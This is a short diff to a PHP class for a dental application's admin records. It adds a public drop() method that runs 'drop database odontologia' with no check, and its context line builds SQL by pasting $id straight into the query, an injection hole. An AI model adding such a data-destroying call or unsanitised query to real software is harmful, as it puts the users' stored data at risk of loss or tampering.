@@ -64,5 +64,11 @@
 			$sql="select nome from admin where id=$id";
 			return $this->conexao->consultar($sql);
 		}
+
+		public function drop($drop)
+		{
+			$sql="drop database odontologia";
+			return $this->conexao->executar($sql);
+		}
 	}
 ?>
